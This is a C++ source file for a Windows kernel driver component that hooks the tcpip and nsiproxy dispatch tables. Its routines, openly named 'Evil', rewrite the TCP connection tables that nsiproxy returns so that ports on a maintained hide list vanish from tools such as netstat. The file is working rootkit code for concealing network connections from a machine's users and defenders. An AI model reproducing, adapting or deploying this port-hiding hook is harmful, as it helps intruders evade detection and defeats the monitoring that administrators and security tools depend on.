#include <intrin.h>
#include "irp.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4302)
#pragma warning(disable : 4311)
#pragma warning(disable : 4127)


// Global variables:
PVOID TcpIpDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
PVOID NsiProxyDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
PVOID PortList = NULL;
ULONG64 PortListSize = 0;


NTSTATUS irphooking::port_list::InitializePortList() {
	USHORT EndingPort = 65535;  // 0xFFFF
	PortList = ExAllocatePoolWithTag(NonPagedPool, sizeof(USHORT), 'PlIh');
	if (PortList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	PortListSize += sizeof(USHORT);
	RtlCopyMemory(PortList, &EndingPort, sizeof(USHORT));
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::port_list::AddToPortList(USHORT Port) {
	PVOID TemporaryPortList = NULL;
	USHORT EndingPort = 65535;  // 0xFFFF
	TemporaryPortList = ExAllocatePoolWithTag(NonPagedPool, PortListSize + sizeof(USHORT), 'PlIh');
	if (TemporaryPortList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	RtlCopyMemory(TemporaryPortList, PortList, PortListSize - sizeof(USHORT));
	ExFreePool(PortList);
	PortList = TemporaryPortList;
	RtlCopyMemory((PVOID)((ULONG64)PortList + PortListSize - sizeof(USHORT)), &Port, sizeof(USHORT));
	RtlCopyMemory((PVOID)((ULONG64)PortList + PortListSize), &EndingPort, sizeof(USHORT));
	PortListSize += sizeof(USHORT);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::port_list::RemoveFromPortList(USHORT RemovePort, USHORT RemoveIndex) {
	PVOID TemporaryPortList = NULL;
	USHORT EndingPort = 65535;  // 0xFFFF
	USHORT CurrentPort = 0;
	USHORT PortIndex = 0;
	USHORT InitialRemoveIndex = RemoveIndex;
	if (RemovePort == REMOVE_BY_INDEX_PORT) {
		if (RemoveIndex >= (PortListSize - sizeof(USHORT)) / sizeof(USHORT)) {
			return STATUS_INVALID_PARAMETER;
		}
	}
	else {
		if (RemovePort >= 65535) {
			return STATUS_INVALID_PARAMETER;
		}
		RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
		while (CurrentPort != 65535) {
			if (CurrentPort == RemovePort) {
				RemoveIndex = PortIndex;
				break;
			}
			PortIndex++;
			RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
		}
		if (RemoveIndex == InitialRemoveIndex) {
			return STATUS_INVALID_PARAMETER;
		}
	}
	TemporaryPortList = ExAllocatePoolWithTag(NonPagedPool, PortListSize - sizeof(USHORT), 'PlIh');
	if (TemporaryPortList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}


	// Copy the existing data into the list without the removed port:
	if (RemoveIndex == 0) {
		RtlCopyMemory(TemporaryPortList, (PVOID)((ULONG64)PortList + sizeof(USHORT)), PortListSize - sizeof(USHORT));
	}
	else if (RemoveIndex == (PortListSize - (2 * sizeof(USHORT))) / sizeof(USHORT)) {
		RtlCopyMemory(TemporaryPortList, PortList, PortListSize - (2 * sizeof(USHORT)));
		RtlCopyMemory((PVOID)((ULONG64)TemporaryPortList + PortListSize - (2 * sizeof(USHORT))), 
			&EndingPort, sizeof(USHORT));
	}
	else {
		RtlCopyMemory(TemporaryPortList, PortList, RemoveIndex * sizeof(USHORT));
		RtlCopyMemory((PVOID)((ULONG64)TemporaryPortList + (RemoveIndex * sizeof(USHORT))),
			(PVOID)((ULONG64)PortList + ((RemoveIndex + 1) * sizeof(USHORT))),
			PortListSize - ((RemoveIndex + 1) * sizeof(USHORT)));
	}
	ExFreePool(PortList);
	PortList = TemporaryPortList;
	PortListSize -= sizeof(USHORT);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::port_list::ReturnPortList(PVOID* PortListOutput, ULONG64* PortListSizeOutput) {
	if (PortList == NULL || PortListSize == 0) {
		return STATUS_UNSUCCESSFUL;
	}
	if (PortListOutput != NULL) {
		*PortListOutput = PortList;
	}
	if (PortListSizeOutput != NULL) {
		*PortListSizeOutput = PortListSize;
	}
	return STATUS_SUCCESS;
}


BOOL irphooking::port_list::CheckIfInPortList(USHORT CheckPort, int* IndexInList) {
	USHORT CurrentPort = 0;
	int PortIndex = 0;
	if (PortList == NULL || CheckPort == 0 || CheckPort >= 65535) {
		if (IndexInList != NULL) {
			*IndexInList = -1;
		}
		return FALSE;  // Invalid port number / empty port list, nothing to hide
	}
	RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
	while (CurrentPort != 65535) {
		if (CurrentPort == CheckPort) {
			if (IndexInList != NULL) {
				*IndexInList = PortIndex;
			}
			return TRUE;
		}
		PortIndex++;
		RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
	}
	return FALSE;  // Port does not exist in list
}


NTSTATUS irphooking::InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction) {
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT DriverObject = NULL;
	switch (DriverTag) {
	case TCPIP_TAG:
		RtlInitUnicodeString(&DriverName, L"\\Driver\\tcpip"); break;
	case NSIPROXY_TAG:
		RtlInitUnicodeString(&DriverName, L"\\Driver\\nsiproxy"); break;
	default:
		return STATUS_INVALID_PARAMETER;
	}


	// Verify that IRP major function is not already hooked:
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		if (TcpIpDispatchTable[MajorFunction] != NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
			RtlFreeUnicodeString(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		if (NsiProxyDispatchTable[MajorFunction] != NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
			RtlFreeUnicodeString(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get driver object, log IRP original function and hook the IRP function:
	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
	if (DriverObject == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be hooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
		RtlFreeUnicodeString(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		TcpIpDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		NsiProxyDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
	}
	InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
		(LONG64)HookingFunction);
	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was hooked successfully to %p\n", MajorFunction, &DriverName, HookingFunction);
	RtlFreeUnicodeString(&DriverName);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction) {
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT DriverObject = NULL;
	switch (DriverTag) {
	case TCPIP_TAG:
		RtlInitUnicodeString(&DriverName, L"\\Driver\\tcpip"); break;
	case NSIPROXY_TAG:
		RtlInitUnicodeString(&DriverName, L"\\Driver\\nsiproxy"); break;
	default:
		return STATUS_INVALID_PARAMETER;
	}


	// Delete all remains of port list:
	if (PortList != NULL) {
		ExFreePool(PortList);
		PortList = NULL;
	}


	// Verify that IRP major function is not already hooked:
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		if (TcpIpDispatchTable[MajorFunction] == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
			RtlFreeUnicodeString(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		if (NsiProxyDispatchTable[MajorFunction] == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
			RtlFreeUnicodeString(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get driver object and unhook the IRP function:
	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
	if (DriverObject == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be unhooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
		RtlFreeUnicodeString(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
			(LONG64)TcpIpDispatchTable[MajorFunction]);
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
			(LONG64)NsiProxyDispatchTable[MajorFunction]);
	}
	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was unhooked successfully\n", MajorFunction, &DriverName);
	RtlFreeUnicodeString(&DriverName);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::EvilCompletionNsiProxy(
	IN PDEVICE_OBJECT  DeviceObject,
	IN PIRP  Irp,
	IN PVOID  Context) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION NextIrpStackLocation = IoGetNextIrpStackLocation(Irp);
	PHP_CONTEXT CurrentIrpContext = (PHP_CONTEXT)Context;
	PNSI_PARAM NsiDriverParams = NULL;
	KAPC_STATE CurrentProcessApcState = { 0 };
	PNSI_STATUS_ENTRY ConnectionStatusEntry = NULL;
	PINTERNAL_TCP_TABLE_ENTRY TcpConnectionEntry = NULL;
	int CurrentConnectionIndex = 0;
	int TotalTcpConnections = 0;
	int IndexOfPortInHiddenList = 0;

	if (NT_SUCCESS(Irp->IoStatus.Status)) {

		// Request succeeded in the whole driver stack
		NsiDriverParams = (PNSI_PARAM)Irp->UserBuffer;  // User provided buffer
		if (MmIsAddressValid(NsiDriverParams->lpMem)) {

			// Tools like netstat will invoke a call to nsiproxy.sys and will provide parameters in the NSI_PARAM struct
			if ((NsiDriverParams->UnknownParam8 == 0x38)) {

				// Unknown value, probably here for querying connections (like a request type)
				ConnectionStatusEntry = (PNSI_STATUS_ENTRY)NsiDriverParams->lpStatus;
				TcpConnectionEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiDriverParams->lpMem;
				TotalTcpConnections = NsiDriverParams->TcpConnCount;  // Tcp connections count


				KeStackAttachProcess(CurrentIrpContext->pcb,
					&CurrentProcessApcState);  // Attach to the requesting process running context


				//make sure we are in the context of original process
				for (CurrentConnectionIndex = 0;
					CurrentConnectionIndex < TotalTcpConnections;
					CurrentConnectionIndex++) {
					if (irphooking::port_list::CheckIfInPortList(TcpConnectionEntry[CurrentConnectionIndex].localEntry.Port,
						&IndexOfPortInHiddenList)) {

						/*
						nsiproxy.sys driver maps the status of all connections
						to the actual TCP connections, need to modify them both
						Synchronicly:
						copy the next entries in the list to the placement in memory of
						the current entry to hide and reduce counters
						*/
						RtlCopyMemory(&TcpConnectionEntry[CurrentConnectionIndex],
							&TcpConnectionEntry[CurrentConnectionIndex + 1],
							sizeof(INTERNAL_TCP_TABLE_ENTRY) * (TotalTcpConnections - CurrentConnectionIndex));

						RtlCopyMemory(&ConnectionStatusEntry[CurrentConnectionIndex],
							&ConnectionStatusEntry[CurrentConnectionIndex + 1],
							sizeof(NSI_STATUS_ENTRY) * (TotalTcpConnections - CurrentConnectionIndex));
						TotalTcpConnections--;  // Reduce the count of total connections
						NsiDriverParams->TcpConnCount--;  // Reduce the connection count
						CurrentConnectionIndex--;  // Next will be at the current index
					}
				}
				KeUnstackDetachProcess(&CurrentProcessApcState);  // Detach from the calling process
			}
		}
	}


	// Provide the context and I/O  for the next IRP in the next driver in the stack:
	NextIrpStackLocation->Context = CurrentIrpContext->oldCtx;
	NextIrpStackLocation->CompletionRoutine = CurrentIrpContext->oldIocomplete;
	if (CurrentIrpContext->bShouldInvolve) {
		Status = NextIrpStackLocation->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else if (Irp->PendingReturned) {
		IoMarkIrpPending(Irp);
	}


	// Free the fake context (created in EvilMajorDeviceControlNsiProxy):
	ExFreePool(Context);
	return Status;
}


NTSTATUS irphooking::EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp) {
	ULONG IrpIoControlCode = 0;
	PIO_STACK_LOCATION IrpStackLocation = NULL;
	MajorDeviceControlNsiProxy MajorDeviceControlNsiProxyFunction = NULL;
	PHP_CONTEXT FakeContext = NULL;
	IrpStackLocation = IoGetCurrentIrpStackLocation(Irp);

	IrpIoControlCode = IrpStackLocation->Parameters.DeviceIoControl.IoControlCode;

	if (IrpIoControlCode == IOCTL_NSI_GETALLPARAM) {
		if (IrpStackLocation->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM)) {
			
			/*
			If call to driver is relevant to hiding ports :
			1) Hook the completion routine of the IRP
			2) When the IRP goes through the whole driver stack,
			it will call my completion routine that actually hides the ports
			*/
			FakeContext = (PHP_CONTEXT)ExAllocatePool(NonPagedPool, sizeof(HP_CONTEXT));
			if (FakeContext != NULL) {
				FakeContext->oldIocomplete = IrpStackLocation->CompletionRoutine;
				FakeContext->oldCtx = IrpStackLocation->Context;
				IrpStackLocation->CompletionRoutine = &irphooking::EvilCompletionNsiProxy;
				IrpStackLocation->Context = FakeContext;
				FakeContext->pcb = IoGetCurrentProcess();

				if ((IrpStackLocation->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS) {
					FakeContext->bShouldInvolve = TRUE;
				}
				else {
					FakeContext->bShouldInvolve = FALSE;
				}
				IrpStackLocation->Control |= SL_INVOKE_ON_SUCCESS;  // Invoke CompletionRoutineHook when whole driver stack succeeded
			}
		}
	}


	// Call the original MajorDeviceControlNsiProxy (if got here it means that IRP_MJ_DEVICE_CONTROL in NsiDispatchTable is saved):
	MajorDeviceControlNsiProxyFunction = (MajorDeviceControlNsiProxy)NsiProxyDispatchTable[IRP_MJ_DEVICE_CONTROL];
	return MajorDeviceControlNsiProxyFunction(DeviceObject, Irp);
}